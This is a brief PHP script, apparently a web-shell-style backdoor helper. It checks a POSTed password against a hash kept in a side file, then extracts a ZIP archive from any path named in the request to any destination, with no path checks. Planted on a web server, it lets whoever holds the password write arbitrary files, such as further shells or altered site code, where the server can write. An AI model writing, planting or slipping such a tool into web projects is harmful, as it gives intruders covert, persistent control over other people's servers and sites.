<?php /* 16.09.16 
1 url, 2 str
s[1] - кудаа
*/
if(!file_exists('./p.php')){exit('[X] PASS Not Exist');}
$s=explode('*',file_get_contents('./p.php'));
if(md5($_POST['p'])!=$s[1]){exit('[X] PASS');}
$s=explode('~',$_POST['s']);

$d=explode('~', $_POST['file']);

if(file_exists($s[1])){
        $zip = new ZipArchive;
        $zip->open($s[1]);
        $zip->extractTo($s[2]);
        $zip->close();
        echo '[V] ZipOut good!'; 
	}else{
		echo '[X] ZipUrl Not exist!';
	}



?>
